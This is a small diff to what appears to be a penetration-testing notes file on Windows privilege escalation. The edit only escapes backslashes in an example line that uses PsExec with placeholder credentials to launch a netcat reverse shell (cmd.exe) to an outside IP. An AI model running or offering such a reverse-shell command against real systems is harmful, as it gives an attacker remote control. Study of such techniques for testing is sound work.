@@ -46,5 +46,5 @@ from https://github.com/M4ximuss/Powerless
 
 - PsExec.exe / PsExec64.exe |  to run with elevated accounts
 
-	- eg  PsExec64.exe \\DOMAIN -u USERNAME -p PASSWORD nc.exe -e cmd.exe 10.11.0.106 80 
+	- eg  PsExec64.exe \\\\DOMAIN -u USERNAME -p PASSWORD nc.exe -e cmd.exe 10.11.0.106 80 
 
